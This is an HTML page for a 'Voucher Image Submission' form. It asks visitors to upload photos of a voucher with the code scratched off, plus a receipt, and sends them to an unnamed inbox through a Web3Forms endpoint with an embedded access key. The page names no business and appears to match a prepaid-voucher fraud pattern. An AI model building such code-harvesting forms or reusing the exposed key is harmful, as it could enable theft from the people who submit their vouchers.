<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voucher Submission</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom font */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
        :root {
            font-family: 'Inter', sans-serif;
        }
        .text-gradient {
            background-image: linear-gradient(to right, #4F46E5, #8B5CF6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
    </style>
</head>
<body class="bg-gray-50 min-h-screen p-4 sm:p-8 flex items-start justify-center">

    <div class="w-full max-w-lg bg-white shadow-2xl rounded-xl p-6 sm:p-8 border border-gray-100">
        <!-- Header -->
        <header class="text-center mb-8">
            <h1 class="text-3xl sm:text-4xl font-extrabold text-gradient mb-2">
                Voucher Image Submission
            </h1>
            <p class="text-gray-500 text-sm sm:text-base">
                Directly upload your images for processing.
            </p>
        </header>

        <!-- The entire application is now a single HTML form -->
        <form action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data" id="submissionForm" onsubmit="handleSubmission(event)">
            
            <!-- Hidden Fields for Web3Forms Configuration -->
            <input type="hidden" name="access_key" value="911e988a-6472-4daa-be29-4b4da9696d45">
            <input type="hidden" name="subject" value="New Direct Image Submission">
            <input type="hidden" name="from_name" value="Voucher Submission App">
            <input type="hidden" name="redirect" value="https://web3forms.com/success">
            <input type="hidden" name="Message" value="Images attached for verification.">
            
            <!-- Image Upload Section -->
            <section class="mb-8">
                <label for="imageUpload" class="block text-xl font-semibold text-gray-700 mb-1">Upload Voucher & Receipt Images</label>
                <p class="text-sm text-red-500 font-semibold mb-4 p-2 bg-red-50 rounded-lg">
                    ⚠️ **Instruction:** The voucher code must be scratched. Upload all necessary files (e.g., Voucher photo, Receipt photo) in a single selection.
                </p>
                <!-- NOTE: The 'name' attribute is crucial for Web3Forms to receive the files -->
                <input type="file" id="imageUpload" name="uploaded_files[]" accept="image/*" multiple required
                    class="w-full text-sm text-gray-500
                        file:mr-4 file:py-3 file:px-5
                        file:rounded-full file:border-0
                        file:text-base file:font-semibold
                        file:bg-violet-50 file:text-violet-700
                        hover:file:bg-violet-100 transition duration-150"
                    onchange="previewImages(event)">
                
                <!-- Image Preview Area -->
                <div id="imagePreviewContainer" class="mt-4 p-3 bg-gray-100 rounded-lg hidden flex flex-wrap gap-2">
                    <!-- Previews will be dynamically inserted here -->
                </div>
            </section>

            <!-- Action Button -->
            <div class="flex justify-center mb-6">
                <!-- Button now acts as a native form submit -->
                <button type="submit" id="submitButton" 
                    class="w-full sm:w-auto px-8 py-3 bg-violet-600 text-white font-semibold rounded-full shadow-xl hover:bg-violet-700 focus:outline-none focus:ring-4 focus:ring-violet-500 focus:ring-opacity-50 transition duration-150 ease-in-out">
                    Submit Images
                </button>
            </div>

            <!-- Message Box remains to show pre-submission errors (e.g., no file selected) -->
            <div id="messageBox" class="p-3 rounded-lg text-center font-medium transition duration-300 ease-in-out hidden"></div>
        
        </form>
        
    </div>

    <script>
        // --- UI Elements ---
        const messageBox = document.getElementById('messageBox');
        
        // --- Utility Functions ---

        // Handles image preview for multiple files
        function previewImages(event) {
            const files = event.target.files;
            const container = document.getElementById('imagePreviewContainer');
            
            container.innerHTML = ''; // Clear existing previews
            container.classList.add('hidden');
            messageBox.classList.add('hidden'); // Clear any previous error messages

            if (files.length > 0) {
                for (const file of files) {
                    if (file.type.startsWith('image/')) {
                        const fileURL = URL.createObjectURL(file);
                        
                        const previewDiv = document.createElement('div');
                        previewDiv.className = 'w-24 h-24 overflow-hidden rounded-lg shadow-md relative';
                        
                        const previewImg = document.createElement('img');
                        previewImg.src = fileURL;
                        previewImg.alt = file.name;
                        previewImg.className = 'w-full h-full object-cover';

                        const fileNameText = document.createElement('p');
                        fileNameText.textContent = file.name;
                        fileNameText.className = 'absolute bottom-0 left-0 right-0 bg-black bg-opacity-50 text-white text-xs text-center truncate p-0.5';

                        previewDiv.appendChild(previewImg);
                        previewDiv.appendChild(fileNameText);
                        container.appendChild(previewDiv);
                    }
                }
                container.classList.remove('hidden');
            }
        }
        
        // --- Submission Handler ---
        function handleSubmission(event) {
            const fileInput = document.getElementById('imageUpload');
            if (fileInput.files.length === 0) {
                // Prevent submission and show error if no files are selected
                event.preventDefault();
                displayError("Please select at least one image before submitting.");
            } else {
                // Temporarily disable the button to prevent double-clicks
                document.getElementById('submitButton').disabled = true;
            }
            // If files exist, the form is allowed to submit natively and redirect.
        }

        // --- Message Display Functions ---

        function displayError(message) {
            messageBox.innerHTML = `
                <div class="bg-red-100 border border-red-400 text-red-700 p-3 rounded relative shadow-sm" role="alert">
                    <strong class="font-bold">Error:</strong>
                    <span class="block sm:inline"> ${message}</span>
                </div>`;
            messageBox.classList.remove('hidden');
        }

    </script>
</body>
</html>

